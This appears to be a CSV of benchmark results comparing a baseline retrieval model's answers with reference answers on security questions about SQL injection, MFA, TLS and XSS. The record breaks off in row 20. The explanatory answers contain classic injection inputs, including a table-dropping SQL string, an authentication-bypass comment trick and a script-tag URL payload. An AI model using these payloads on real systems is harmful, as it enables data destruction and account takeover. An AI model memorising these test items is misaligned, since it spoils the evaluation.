@@ -1,1 +1,592 @@
 question_id,question,reference_answer,baseline_answer,baseline_confidence,baseline_n_supported,baseline_n_sentences,baseline_sources,baseline_latency_sec,baseline_error,finetuned_answer,finetuned_confidence,finetuned_n_supported,finetuned_n_sentences,finetuned_sources,finetuned_latency_sec,finetuned_error
+1,What is SQL injection?,"SQL injection is a web application vulnerability that occurs when an attacker inserts malicious SQL code into a query that an application sends to its database, allowing them to read, modify, or delete data, execute administrative operations, and issue commands to the operating system.","**SQL injection (SQLi)** is a web‑application vulnerability that occurs when an attacker supplies untrusted input that is incorporated directly into a SQL query without proper sanitisation. Because the input is treated as part of the query’s code, the attacker can alter the query’s logic, causing the database to return, modify, or delete data, or even execute administrative or operating‑system commands.
+
+Key points:
+
+| Aspect | Details |
+|--------|---------|
+| **How it works** | User input is concatenated into a SQL statement (e.g., `SELECT * FROM users WHERE username = '` + input + `'`). If the input contains SQL syntax such as `' OR '1'='1`, the query’s logic is changed. |
+| **Typical payload** | `'; DROP TABLE users; --` or `1' OR '1'='1`. |
+| **Consequences** | • Read, modify, or delete data<br>• Bypass authentication<br>• Execute administrative operations<br>• In some cases, trigger OS commands via database features |
+| **Types** | 1. **In‑band SQLi** – data returned in the same channel (Error‑based, Union‑based).<br>2. **Blind (inferential) SQLi** – no data returned; attacker infers information from application responses (Boolean‑based, Time‑based).<br>3. **Out‑of‑band SQLi** – uses separate channels (e.g., DNS or HTTP requests) to receive data. |
+| **Prevention** | • Use parameterised queries / prepared statements.<br>• Employ stored procedures that separate data from code.<br>• Validate and whitelist input.<br>• Apply least‑privilege to database accounts.<br>• Deploy Web Application Firewalls (WAFs) as an additional layer.<br>• Conduct regular security audits and penetration testing. |
+
+SQL injection remains a top‑ranked risk in the OWASP Top 10 because it is both common and highly damaging.",52.25,10,11,doc1.txt; doc41.txt; doc19.txt,5.35,,,,,,,,skipped (model not loaded)
+2,How does SQL injection occur?,"SQL injection occurs when user-supplied input is not properly sanitized before being included in a SQL query, allowing attackers to manipulate the query logic.","SQL injection (SQLi) happens when a web application takes user‑supplied data and inserts it directly into a SQL statement without properly sanitising or parameterising that data. Because the database engine treats the entire string as part of the query, an attacker can add or alter SQL clauses, change the logic of the statement, or append new commands.  
+
+**Typical flow**
+
+1. **User input** – The attacker supplies data through a form field, URL parameter, cookie, or any other input vector.  
+2. **Application builds a query** – The code concatenates the raw input into a SQL string, e.g.  
+   ```sql
+   SELECT * FROM users WHERE username = '$user' AND password = '$pass';
+   ```  
+3. **Database executes the query** – The database parses the whole string as SQL. If the input contains characters like `'`, `;`, `--`, or `OR 1=1`, the query’s logic is altered.  
+4. **Result** – The attacker can bypass authentication, read, modify, or delete data, or even run administrative commands.
+
+**Why it works**
+
+- **No input validation or escaping** – The application does not check that the data matches an expected format (e.g., only alphanumeric usernames).  
+- **No parameterised queries** – Prepared statements or stored procedures that separate data from code are not used.  
+- **Direct string concatenation** – The raw input is embedded into the SQL string, so any SQL syntax the attacker injects becomes part of the executed query.
+
+**Example of a vulnerable login form**
+
+```php
+$username = $_POST['username'];
+$password = $_POST['password'];
+$sql = ""SELECT * FROM users WHERE username='$username' AND password='$password'"";
+```
+
+If the attacker submits `admin' --` as the username, the query becomes:
+
+```sql
+SELECT * FROM users WHERE username='admin' --' AND password='...'
+```
+
+The `--` comments out the rest of the statement, allowing the attacker to log in as `admin` without knowing the password.
+
+**Bottom line**
+
+SQL injection occurs when user input is incorporated into SQL statements without proper sanitisation or parameterisation, allowing attackers to manipulate the query logic and gain unauthorized access to or control over the database.",49.76,13,14,doc1.txt; doc41.txt; doc2.txt,2.8,,,,,,,,skipped (model not loaded)
+3,What are the three main types of SQL injection?,"The three main types of SQL injection are In-band SQLi, Inferential (Blind) SQLi, and Out-of-band SQLi.","The three main types of SQL injection are:
+
+1. **In‑band SQLi** – The attacker uses the same channel to both launch the attack and receive the results.  
+   *Sub‑types:* Error‑based SQLi and Union‑based SQLi.
+
+2. **Inferential (Blind) SQLi** – No data is directly returned through the web application; the attacker infers information by observing the application's responses.  
+   *Sub‑types:* Boolean‑based blind SQLi and Time‑based blind SQLi.
+
+3. **Out‑of‑band SQLi** – The attack and data retrieval occur over different channels, relying on database features that allow external communication (e.g., sending data via DNS or HTTP requests).",52.91,5,6,doc1.txt; doc2.txt; doc41.txt,3.36,,,,,,,,skipped (model not loaded)
+4,Why is input validation important in preventing SQL injection?,"Input validation is important in preventing SQL injection because it ensures that user-supplied input is properly sanitized before being included in a SQL query, preventing attackers from manipulating the query logic.","Input validation is a first‑line, application‑level defense that stops malicious data from ever reaching the database query engine.  
+When a web application accepts user‑supplied values, those values can be crafted to alter the structure of an SQL statement (e.g., `'; DROP TABLE users;--`). If the application blindly concatenates the value into a query string, the database will interpret the injected text as part of the SQL command and execute it.  
+
+By validating input before it is used, the application can:
+
+1. **Enforce a strict format** – only allow characters, lengths, and patterns that are expected for a given field (e.g., numeric IDs, email addresses, hostnames).  
+2. **Reject or neutralize dangerous tokens** – strip or reject characters that have special meaning in SQL (`'`, `;`, `--`, etc.) or in the shell (`|`, `&&`, `$()`).  
+3. **Reduce the attack surface** – if only a narrow, well‑defined set of values can be supplied, the attacker has no opportunity to inject arbitrary SQL fragments.  
+
+When combined with other controls such as parameterised queries, least‑privilege database accounts, and WAFs, input validation forms a critical layer that prevents malformed or malicious data from ever forming part of an executable SQL statement.  
+
+*Gap:* The provided sources describe the importance of validation but do not list specific validation patterns or libraries; the answer relies on the general principle that “whitelisting” expected input is the most effective strategy.",47.73,7,9,doc1.txt; doc41.txt; doc2.txt,4.93,,,,,,,,skipped (model not loaded)
+5,What are some prevention strategies for SQL injection?,"Prevention strategies for SQL injection include using parameterized queries, stored procedures, input validation and whitelisting, applying the principle of least privilege to database accounts, and using Web Application Firewalls (WAFs).","**Key prevention strategies for SQL injection**
+
+| Strategy | What it does | Practical example |
+|----------|--------------|-------------------|
+| **Use parameterised queries / prepared statements** | Separates data from code so user input can’t alter SQL syntax. | In PHP: `mysqli_prepare($conn, ""SELECT * FROM users WHERE id = ?"")`; in Java: `PreparedStatement ps = conn.prepareStatement(""SELECT * FROM users WHERE id = ?""); ps.setInt(1, userId);` |
+| **Employ stored procedures (with care)** | Keeps SQL logic on the database side; still requires parameterisation. | `CALL GetUserById(?, ?)` where the procedure validates parameters. |
+| **Validate and whitelist input** | Accept only expected values (e.g., numeric IDs, email formats). Reject anything else. | `if (!preg_match('/^\d+$/', $id)) { throw new Exception('Invalid ID'); }` |
+| **Apply the principle of least privilege** | Database accounts used by the app should have only the permissions they need. | A web‑app account that only reads from `users` table, not `DROP TABLE`. |
+| **Use an ORM or query builder** | These frameworks automatically parameterise queries. | Laravel’s Eloquent, Hibernate, or Doctrine. |
+| **Sanitise output, not input** | Escape data when rendering it back to the user (e.g., HTML‑escaping) to avoid XSS, not SQL injection. | `htmlspecialchars($output, ENT_QUOTES, 'UTF-8');` |
+| **Deploy a Web Application Firewall (WAF)** | Detects and blocks common injection patterns. | ModSecurity rules for SQLi. |
+| **Regular security testing** | Pen‑testing, static code analysis, and automated scans catch injection flaws early. | OWASP ZAP, Burp Suite, or SAST tools. |
+| **Keep software up‑to‑date** | Patch database engines, libraries, and frameworks that may contain known injection fixes. | Update MySQL, PostgreSQL, or the web framework. |
+
+**Bottom line:** The most effective defense is to **never concatenate user input into SQL strings**. Use parameterised queries or safe abstractions, validate input against strict allowlists, run the database with minimal privileges, and supplement with WAFs and regular testing.",37.12,9,18,doc1.txt; doc41.txt; doc19.txt,12.94,,,,,,,,skipped (model not loaded)
+6,What is the primary cause of account compromise?,"Weak authentication is the leading cause of account compromise, with over 80% of hacking-related breaches involving stolen or brute-forced credentials.","The primary cause of account compromise is **weak authentication**—specifically, stolen or brute‑forced credentials. The 2022 Verizon DBIR reports that over 80 % of hacking‑related breaches involved attackers gaining access through compromised usernames and passwords.",48.89,2,2,doc16.txt; doc28.txt; doc19.txt,20.0,,,,,,,,skipped (model not loaded)
+7,How does multi-factor authentication reduce account compromise risk?,Multi-factor authentication dramatically reduces account compromise risk by requiring evidence from multiple distinct categories.,"**How MFA cuts the risk of account compromise**
+
+1. **Adds a second, independent proof of identity**  
+   * A stolen or guessed password is no longer enough. The attacker must also possess a second factor that is tied to the user’s device or biometric data.  
+   * The three classic categories—something you know (password), something you have (token, phone, hardware key), and something you are (biometric)—are all required, so compromising one factor does not grant access.
+
+2. **Raises the cost and complexity of remote attacks**  
+   * **Password‑only** accounts can be breached via phishing, credential stuffing, or brute‑force.  
+   * With MFA, an attacker must additionally:  
+     * Physically own the device (e.g., a hardware key or phone for TOTP/push).  
+     * Intercept or spoof the second‑factor channel (e.g., SIM‑swap for SMS, malware for push).  
+     * Or bypass a phishing‑resistant mechanism (e.g., FIDO2/WebAuthn keys that refuse to sign for the wrong domain).
+
+3. **Blocks credential‑stuffing and automated login attempts**  
+   * Even if a username/password pair is valid, the second factor is missing, so the login fails.  
+   * This protects against the billions of credential pairs leaked in breaches that attackers routinely try against many sites.
+
+4. **Phishing‑resistance of modern MFA**  
+   * **Hardware security keys** (FIDO2/WebAuthn) perform a cryptographic challenge‑response that includes the site’s origin. They will not sign a request for a spoofed domain, so a phishing site cannot trick the key into authenticating.  
+   * **Passkeys** (public‑key credentials stored on the device) eliminate passwords entirely; the private key never leaves the device, so even if the server is compromised, the attacker cannot replay the authentication.
+
+5. **Reduces the window for “MFA fatigue” or “real‑time phishing”**  
+   * While SMS OTPs and push notifications can be abused, stronger methods (TOTP apps, hardware keys, passkeys) are far less susceptible to these attacks, further tightening the security perimeter.
+
+**Bottom line:**  
+By requiring evidence from two or more distinct categories, MFA turns a single compromised credential into a multi‑step barrier that most attackers cannot cross remotely. This dramatically lowers the likelihood that stolen or guessed passwords will lead to successful account takeover.",47.54,13,16,doc16.txt; doc21.txt; doc30.txt,18.72,,,,,,,,skipped (model not loaded)
+8,What is the recommended authentication mechanism for privileged accounts?,"Privileged accounts warrant the strongest authentication controls, including hardware security keys, just-in-time privileged access management (PAM), and session recording.","**Recommended authentication for privileged accounts**
+
+| Layer | What to use | Why it’s the best choice |
+|-------|-------------|--------------------------|
+| **Primary factor** | **Hardware security key (FIDO2/WebAuthn)** – or a passkey stored on a device that uses the same public‑key cryptography | • Phishing‑resistant: the key only authenticates to the exact domain that issued it.<br>• No password or OTP is transmitted, eliminating credential‑stealing vectors.<br>• Supported by all major browsers and operating systems. |
+| **Secondary factor** | **Just‑in‑time privileged access (PAM) or a separate privileged‑access workstation (PAW)** | • Limits the time a privileged credential is active.<br>• Adds an approval workflow and session recording for auditability. |
+| **Additional controls** | • **Protected Users** group (AD) to block NTLM and enforce Kerberos AES.<br>• **Credential Guard** to isolate LSASS.<br>• **LAPS** for local admin passwords on endpoints.<br>• **Audit & monitoring** (e.g., Microsoft Defender for Identity) to detect PtH, PtT, Kerberoasting, etc. | • Hardens the environment against the most common AD‑based attacks. |
+
+**Bottom line:**  
+For privileged accounts, the industry‑standard recommendation is to enforce **multi‑factor authentication that uses a hardware security key (FIDO2/WebAuthn) as the primary factor**, combined with just‑in‑time privileged‑access controls and rigorous monitoring. This approach satisfies NIST SP 800‑63B, CISA’s MFA guidance, and the hardening practices outlined for Active Directory.",54.76,6,6,doc16.txt; doc21.txt; doc40.txt,21.66,,,,,,,,skipped (model not loaded)
+9,What is the difference between TOTP apps and SMS OTP?,"TOTP apps are more secure than SMS OTP because they generate codes based on a shared secret and current time, but they are still vulnerable to real-time phishing, whereas SMS OTP is vulnerable to SIM swapping and SS7 protocol attacks.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per minute (TPM): Limit 8000, Used 4745, Requested 3626. Please try again in 2.782499999s. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
+10,Why does NIST recommend against mandatory password rotation?,"NIST recommends against mandatory password rotation because it drives predictable patterns, which can be exploited by attackers, and instead focuses on breach detection and length.","NIST recommends against mandatory password rotation because it tends to **drive users toward predictable, weak‑password habits** rather than improving security.  
+
+Key points from the guidance:
+
+| Reason | What it means for users and security |
+|--------|---------------------------------------|
+| **Predictable patterns** | When passwords must be changed on a fixed schedule (e.g., every 90 days), people often add a simple suffix or increment a number (e.g., “Password1”, “Password2”). This makes the password space far smaller and easier for attackers to guess or brute‑force. |
+| **Reduced password quality** | Frequent forced changes can lead users to choose shorter, simpler passwords or reuse the same password across sites, increasing the risk of compromise. |
+| **No real benefit for most accounts** | For many systems, the risk of credential compromise is driven by phishing, credential stuffing, or data‑breach leaks, not by a static password that is never changed. |
+| **Operational overhead** | Mandatory rotation requires additional user support (password‑reset requests, help‑desk tickets) and can degrade user experience, which may lead to workarounds (e.g., writing passwords down). |
+| **Focus on stronger controls** | NIST’s guidance shifts emphasis to longer, more complex passwords, breach‑detection mechanisms, rate‑limiting, and, most importantly, multi‑factor authentication (MFA). These controls provide far greater protection than periodic rotation. |
+
+In short, mandatory rotation is **ineffective** and can actually **weaken** overall security by encouraging predictable, low‑entropy passwords and increasing operational friction. NIST therefore advises against it and instead recommends focusing on password length, breach detection, and MFA.",46.79,9,10,doc16.txt; doc21.txt; doc3.txt,4.99,,,,,,,,skipped (model not loaded)
+11,What is the primary purpose of the TLS handshake in TLS 1.3?,"The primary purpose of the TLS handshake in TLS 1.3 is to establish a secure connection between the client and server, including the selection of a cipher suite, the exchange of key shares, and the authentication of the handshake.","The TLS 1.3 handshake’s main job is to **establish a shared, authenticated session key**.  
+During the handshake the client and server agree on a cipher suite, exchange Diffie‑Hellman key‑share values, authenticate the server’s certificate, and use the shared DH values to derive the symmetric keys that will encrypt and authenticate all subsequent application data.",65.55,2,2,doc17.txt; doc4.txt; doc45.txt,16.81,,,,,,,,skipped (model not loaded)
+12,Why is TLS 1.3 considered more secure than TLS 1.2?,"TLS 1.3 is considered more secure than TLS 1.2 because it reduces the handshake from 2 round trips to 1 round trip, enabling 0-RTT resumption, and allows only five cipher suites that provide forward secrecy.",,,,,,,"Error code: 429 - {'error': {'message': 'Rate limit reached for model `openai/gpt-oss-20b` in organization `org_01kstjnf3kfhzsy8phd3g1g2sc` service tier `on_demand` on tokens per minute (TPM): Limit 8000, Used 4512, Requested 3510. Please try again in 164.999999ms. Need more tokens? Upgrade to Dev Tier today at https://console.groq.com/settings/billing', 'type': 'tokens', 'code': 'rate_limit_exceeded'}}",,,,,,,skipped (model not loaded)
+13,How does a client validate a server certificate in TLS?,"A client validates a server certificate by checking that the certificate chain leads to a trusted root CA, the certificate has not expired, the certificate has not been revoked, and the certificate's Subject Alternative Name (SAN) matches the hostname being accessed.","**Client‑side server‑certificate validation (TLS)**
+
+When a TLS client (browser, mail client, VPN, etc.) receives a server’s certificate chain during the handshake, it performs a series of checks to decide whether the server can be trusted. The process is defined by RFC 8446 (TLS 1.3) and RFC 5280 (X.509) and is implemented by all major TLS libraries.
+
+| Step | What the client does | Why it matters |
+|------|----------------------|----------------|
+| **1. Chain construction** | The client collects the server’s leaf certificate and any intermediate certificates sent by the server. It then builds a chain up to a *trust anchor* (root CA) that is present in the client’s trust store. | A valid chain is required for the certificate to be considered trustworthy. |
+| **2. Signature verification** | For each link in the chain, the client verifies the digital signature using the public key of the issuer certificate. | Ensures the certificate was actually issued by the claimed CA and has not been tampered with. |
+| **3. Trust‑anchor check** | The top‑level certificate must be a self‑signed root that the client explicitly trusts (e.g., built‑in OS/browser root store). | Prevents “rogue” CAs from issuing arbitrary certificates. |
+| **4. Validity period** | The client checks that the current time is between the certificate’s *Not‑Before* and *Not‑After* dates. | Guarantees the certificate is still valid and not expired. |
+| **5. Revocation status** | The client queries the CA’s revocation mechanisms:<br>• **OCSP** – real‑time query for the leaf certificate.<br>• **CRL** – download a list of revoked serial numbers.<br>• **OCSP stapling** – accept a signed OCSP response that the server included in the handshake. | Detects certificates that have been revoked before expiry (e.g., key compromise). |
+| **6. Subject Alternative Name (SAN) match** | The client extracts the hostname it is connecting to and verifies that the hostname matches one of the SAN entries (or the legacy Common Name if no SAN is present). | Prevents “certificate‑spoofing” where a certificate for a different domain is presented. |
+| **7. Certificate Transparency (CT) (optional but recommended)** | The client may check that the certificate is logged in public CT logs (via the `ct` extension or by querying a CT log). | Helps detect mis‑issued or rogue certificates that were not properly logged. |
+| **8. Pinning / pin‑hints (if configured)** | If the application has a pin (e.g., a known public‑key hash or a specific CA), the client compares the server’s certificate or public key against the pin. | Provides protection against compromised or mis‑issued CAs. |
+| **9. Policy checks (optional)** | The client may enforce additional constraints such as key usage, extended key usage, or custom policies defined by the application. | Ensures the certificate is appropriate for the intended purpose (e.g., server authentication). |
+
+### Typical flow in a TLS 1.3 handshake
+
+1. **ClientHello** – client sends supported cipher suites, key shares, and optionally a *certificate request* if mutual TLS is desired.
+2. **ServerHello** – server selects cipher suite, sends its key share and the full certificate chain.
+3. **Certificate verification** – the client runs the validation steps above immediately after receiving the chain.
+4. **Finished** – if validation succeeds, the handshake continues; otherwise the client aborts the connection.
+
+### Common pitfalls that break validation
+
+| Misconfiguration | Effect |
+|------------------|--------|
+| **Self‑signed certificates** | Browsers will show a warning; users may bypass it, allowing MitM. |
+| **Expired certificates** | Clients reject the connection; automated renewal (Let’s Encrypt, cert‑manager) is essential. |
+| **Missing or wrong SAN** | Hostname mismatch causes failure; legacy CN usage is discouraged. |
+| **Disabled revocation checks** | Revoked certificates may be accepted, exposing the client to compromised keys. |
+| **Weak or disabled cipher suites** | May allow downgrade attacks; clients should enforce TLS 1.2+ and forward‑secrecy suites. |
+
+**Bottom line:** A TLS client validates a server certificate by building a trusted chain, verifying signatures, checking validity dates, ensuring the hostname matches the SAN, confirming revocation status (OCSP/CRL/OCSP stapling), optionally verifying CT logs, and applying any configured pinning or policy rules. If any of these checks fail, the client aborts the connection to protect the user from a potential MitM or other compromise.",35.86,13,34,doc17.txt; doc36.txt; doc08.txt,6.59,,,,,,,,skipped (model not loaded)
+14,What is the main difference between a self-signed certificate and a CA-issued certificate?,"The main difference between a self-signed certificate and a CA-issued certificate is that a CA-issued certificate is trusted by default, whereas a self-signed certificate requires users to click through browser warnings, making it vulnerable to Man-in-the-Middle (MitM) attacks.","**Main difference**
+
+A **self‑signed certificate** is signed with the same private key that it contains; it has no chain of trust to a recognized Certificate Authority (CA). Because no trusted root CA signs it, browsers and operating systems treat it as untrusted unless the user explicitly accepts the warning or the certificate is manually added to a local trust store.
+
+A **CA‑issued certificate** is signed by a trusted CA whose root certificate is pre‑installed in the client’s trust store (e.g., browsers, OS, mobile devices). The certificate forms part of a chain that ends at that trusted root, allowing automatic validation of the server’s identity without user intervention.
+
+**Key points**
+
+| Feature | Self‑signed | CA‑issued |
+|---------|-------------|-----------|
+| **Signature** | Same key pair (private key signs the cert) | Separate CA key signs the cert |
+| **Trust chain** | None (root = cert itself) | Chain to a trusted root CA |
+| **Client validation** | Requires manual acceptance or local trust store entry | Automatic, based on built‑in root store |
+| **Use case** | Testing, internal or personal use where user can accept risk | Production HTTPS, email signing, code signing, VPN, etc. |
+
+**Gap** – The context does not detail the exact process of adding a self‑signed cert to a trust store, but the core distinction is the presence (CA‑issued) or absence (self‑signed) of a trusted root CA in the validation chain.",39.04,5,6,doc36.txt; doc08.txt; doc17.txt,23.31,,,,,,,,skipped (model not loaded)
+15,Why is HSTS preloading considered a best practice for TLS security?,"HSTS preloading is considered a best practice for TLS security because it hardcodes HTTPS enforcement in browser distributions, eliminating the first-visit vulnerability window before the browser has seen the HSTS header.","**Why HSTS preloading is a best practice for TLS security**
+
+| Reason | What it protects against | How preloading helps |
+|--------|--------------------------|----------------------|
+| **Eliminates the “first‑visit” window** | An attacker can intercept the very first HTTP request to a site and perform an SSL‑strip or downgrade attack before the browser learns the site’s HSTS policy. | The preload list is baked into browsers. When a user visits a preloaded domain, the browser immediately forces an HTTPS connection, even on the first visit, so there is no opportunity for a MitM to downgrade the connection. |
+| **Guarantees HTTPS enforcement for all sub‑domains** | Sub‑domains that are not explicitly configured with HSTS can be accessed over HTTP, creating a weak link in the site’s security chain. | The preload policy requires `includeSubDomains` (or a separate sub‑domain entry). Once preloaded, every sub‑domain of the site is automatically treated as HTTPS‑only. |
+| **Prevents protocol downgrade attacks** | An attacker can force a client to use an older, weaker TLS version (e.g., TLS 1.0 or SSL v3) or even plain HTTP. | HSTS tells the browser to reject any non‑TLS or older‑TLS connections. Preloading ensures this rule is applied before any connection is attempted. |
+| **Reduces reliance on server configuration** | If a site’s HSTS header is mis‑configured or omitted, the browser will fall back to HTTP. | Preloading removes the need for the server to send the header on every response; the policy is enforced by the browser itself. |
+| **Improves user trust and compliance** | Users see the padlock icon immediately and are less likely to click “Proceed anyway” on a warning. | By guaranteeing HTTPS from the first request, the site avoids the warning that would otherwise appear if the first request were HTTP. |
+
+**Bottom line:**  
+HSTS preloading hard‑codes the HTTPS‑only policy into browsers, closing the critical window where an attacker could intercept or downgrade the first connection. It ensures that every visit—whether the user types the URL, clicks a bookmark, or follows a link—starts with a secure TLS session, thereby strengthening the overall security posture of the site.",26.38,4,15,doc17.txt; doc4.txt; doc45.txt,21.79,,,,,,,,skipped (model not loaded)
+16,What is Cross-Site Scripting (XSS)?,Cross-Site Scripting (XSS) is a client-side code injection attack where an attacker injects malicious scripts into otherwise trusted websites.,"**Cross‑Site Scripting (XSS)** is a client‑side code‑injection vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. Because the browser trusts the site that served the page, it executes the injected script as if it came from a legitimate source, enabling the attacker to perform a wide range of malicious actions on behalf of the victim.
+
+Key points:
+
+| Aspect | Details |
+|--------|---------|
+| **What it is** | Injection of executable code (usually JavaScript) into a web page that is then run in the victim’s browser. |
+| **How it works** | The attacker finds a place where user‑supplied data is reflected or stored without proper sanitisation, injects a payload, and the browser executes it when the page is rendered. |
+| **Primary types** | • **Stored (Persistent) XSS** – the payload is saved on the server (e.g., in a database) and served to every user who views the affected page.<br>• **Reflected (Non‑Persistent) XSS** – the payload is included in a single request (often via a crafted URL) and immediately reflected back in the response.<br>• **DOM‑based XSS** – the vulnerability lies entirely in client‑side code; the payload is executed by manipulating the Document Object Model (DOM) without any server‑side interaction. |
+| **Typical vectors** | Comment sections, user profiles, search boxes, error messages, or any input that is later displayed without proper encoding. |
+| **Consequences** | • Session hijacking or cookie theft<br>• Credential theft or keylogging<br>• Phishing or defacement of the site<br>• Redirection to malicious sites<br>• Full account takeover or other privileged actions |
+| **Defences** | • **Output encoding / escaping** (context‑aware, e.g., HTML, JavaScript, CSS, URL)<br>• **Content Security Policy (CSP)** headers to restrict script sources<br>• **Input validation** (whitelisting acceptable characters or patterns)<br>• **Framework‑level auto‑escaping** (React, Angular, etc.)<br>• **HTTPOnly cookies** to prevent JavaScript access to session tokens<br>• **Combination of server‑side validation and context‑aware output encoding** is the most reliable strategy per OWASP. |
+
+In short, XSS is a vulnerability that lets attackers run arbitrary scripts in users’ browsers by exploiting how web applications handle untrusted input, leading to a wide range of security breaches.",63.67,8,8,doc2.txt; doc42.txt; doc15.txt,20.67,,,,,,,,skipped (model not loaded)
+17,What is the primary difference between Stored (Persistent) XSS and Reflected (Non-Persistent) XSS?,"The primary difference between Stored (Persistent) XSS and Reflected (Non-Persistent) XSS is that Stored XSS stores the malicious script permanently on the target server, whereas Reflected XSS delivers the malicious script via a specially crafted URL.","**Primary difference**
+
+| Feature | Stored (Persistent) XSS | Reflected (Non‑Persistent) XSS |
+|---------|--------------------------|--------------------------------|
+| **Where the payload lives** | Permanently saved on the target server (e.g., in a database, comment field, user profile). | Only exists in the request that triggers the response; it is reflected back by the server into the page. |
+| **Impact scope** | Every user who views the affected page receives the malicious script. | Only the user who follows the specially crafted link (or submits the crafted form) receives the script. |
+| **Typical vectors** | Comment sections, forums, user‑generated content that is stored and later rendered. | Search results, error messages, or any page that echoes user input back in the response. |
+| **Persistence** | Persistent – the script remains until removed. | Non‑persistent – the script is gone after the single request/response cycle. |
+
+In short, **Stored XSS embeds the attacker’s code into the application’s data store, making it available to all visitors, whereas Reflected XSS injects the code only into a single response that echoes the attacker’s input, affecting only the user who triggers that response.**",42.36,5,9,doc2.txt; doc15.txt; doc42.txt,17.79,,,,,,,,skipped (model not loaded)
+18,How does a DOM-based XSS attack work?,"A DOM-based XSS attack payload is executed by modifying the DOM environment in the victim's browser, without any server-side interaction.","**DOM‑based XSS** is a client‑side code‑injection flaw that happens entirely in the victim’s browser.  
+The attacker does **not** need the server to echo the payload; instead the vulnerability lies in the way the web page’s JavaScript reads untrusted data (e.g., from the URL, form fields, or local storage) and then writes that data back into the DOM without proper sanitisation.
+
+### Typical attack flow
+
+| Step | What happens | Why it works |
+|------|--------------|--------------|
+| 1. **Craft a malicious URL** | `https://example.com/page.html?user=<script>alert(1)</script>` | The attacker embeds a script payload in a query string or hash fragment. |
+| 2. **Victim clicks the link** | Browser loads the page and parses the URL. | The page’s JavaScript runs immediately. |
+| 3. **Untrusted data is read** | `var user = location.search.substring(1);` or `var user = document.getElementById('input').value;` | The script pulls the attacker‑supplied value into a JavaScript variable. |
+| 4. **Data is written to the DOM** | `document.getElementById('greeting').innerHTML = user;` or `document.write(user);` | The value is inserted into the page’s HTML without escaping. |
+| 5. **Script executes** | The browser interprets the inserted `<script>` tag (or any other executable code) as part of the page. | The malicious code runs with the same privileges as the page (e.g., can read cookies, make XHR requests, etc.). |
+
+Because the payload never touches the server, traditional server‑side defenses (input validation, output encoding) do not help. The flaw is purely in the client‑side code’s handling of the DOM.
+
+### Key points
+
+* **No server round‑trip** – the attack is delivered entirely via the client’s environment.  
+* **Common sources of untrusted data** – URL fragments (`location.hash`), query strings (`location.search`), form inputs, `document.cookie`, `localStorage`, `sessionStorage`, and even `navigator` properties.  
+* **Common DOM APIs that can trigger it** – `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `setTimeout`/`setInterval` with string arguments, and any custom DOM‑building functions that concatenate strings.  
+* **Mitigations** –  
+  * Use safe APIs (`textContent`, `setAttribute`, `createTextNode`) instead of `innerHTML`.  
+  * Sanitize or escape data before inserting it into the DOM.  
+  * Apply a strong Content‑Security‑Policy (CSP) that disallows inline scripts (`script-src 'self'`).  
+  * Keep JavaScript libraries up‑to‑date and avoid eval‑style code.  
+
+In short, a DOM‑based XSS attack works by tricking the victim’s browser into executing attacker‑supplied code that is injected into the page’s DOM through unsafe client‑side manipulation of untrusted input.",45.13,16,20,doc2.txt; doc42.txt; doc1.txt,17.11,,,,,,,,skipped (model not loaded)
+19,What are some consequences of successful XSS attacks?,"Consequences of successful XSS attacks include session hijacking, credential theft, keylogging, phishing, and full account takeover.","Successful XSS attacks can lead to a range of damaging outcomes, including:
+
+| Consequence | What it means |
+|-------------|---------------|
+| **Session hijacking** | The attacker steals the victim’s session cookie and impersonates them. |
+| **Credential theft** | Malicious scripts can capture usernames, passwords, or other sensitive data entered by the user. |
+| **Keylogging** | JavaScript can record keystrokes, revealing confidential information. |
+| **Phishing** | The attacker can inject fake login forms or redirect users to malicious sites that look legitimate. |
+| **Full account takeover** | By combining stolen credentials or session tokens, the attacker can gain complete control of the victim’s account. |
+| **Redirection to malicious sites** | The victim is sent to malware‑laden or phishing pages without their knowledge. |
+| **Defacement** | The attacker modifies the page’s content or layout, damaging the site’s reputation. |
+| **Data exfiltration** | Scripts can read and send sensitive data (e.g., personal info, financial data) to the attacker’s server. |
+| **Privilege escalation** | If the XSS occurs in an admin interface, the attacker can perform privileged actions. |
+
+These outcomes illustrate why XSS is considered one of the most dangerous web‑application vulnerabilities.",48.31,8,10,doc2.txt; doc1.txt; doc42.txt,17.09,,,,,,,,skipped (model not loaded)
+20,Why is using a combination of server-side input validation and context-aware output encoding recommended as a defence strategy against XSS?,The OWASP recommends using a combination of server-side input validation and context-aware output encoding as the most reliable defence strategy because it provides a robust protection against XSS attacks.,"**Why the OWASP‑recommended combo works**
+
+| Step | What it does | Why it matters for XSS |
+|------|--------------|------------------------|
+| **Server‑side input validation** | Reject or sanitize any data that does not match an expected format (e.g., only allow alphanumeric usernames, strip control characters, enforce length limits). | 1. **Pre‑emptive filtering** – removes obvious attack vectors before they ever reach the rendering engine. 2. **Defense‑in‑depth** – even if a client‑side check is bypassed (e.g., by disabling JavaScript or using a custom client), the server still blocks the payload. 3. **Reduces attack surface** – fewer characters reach the output stage, making it harder for an attacker to craft a payload that survives encoding. |
+| **Context‑aware output encoding** | When data is inserted into a page, escape it according to the *exact* context in which it will appear: HTML, attribute, JavaScript string, CSS, URL, etc. | 1. **Guarantees that any remaining data cannot break out of its intended context** – e.g., `<script>` tags are turned into `&lt;script&gt;`, quotes in JavaScript strings are escaped, URLs are percent‑encoded. 2. **Handles edge cases** – some payloads can survive simple validation but still be dangerous if rendered in the wrong context (e.g., a string that looks innocuous in a form field but becomes a script when inserted into an inline event handler). 3. **Mitigates accidental changes** – if the application’s rendering logic changes (e.g., moving a value from a text node to an attribute), the encoding logic automatically protects the new context. |
+
+### The synergy
+
+1. **Layered protection** – Validation removes the bulk of malicious input; encoding is the final safety net that ensures *any* data that slips through is rendered harmless.  
+2. **Coverage of all attack vectors** – XSS can be stored, reflected, or DOM‑based. Validation stops many stored‑payloads early, while encoding protects against reflected and DOM‑based attacks where the payload is re‑inserted into the page.  
+3. **Resilience to developer mistakes** – Even if a developer forgets to escape a variable in a particular template, the context‑aware encoder will still apply the correct escaping, preventing a zero‑day XSS.  
+4. **Performance and maintainability** – Validation is inexpensive and can be enforced once per request; encoding is applied only at render time, keeping the codebase clean and reducing the risk of hard‑coded “magic” escape functions scattered throughout the application.
+
+### Bottom line
+
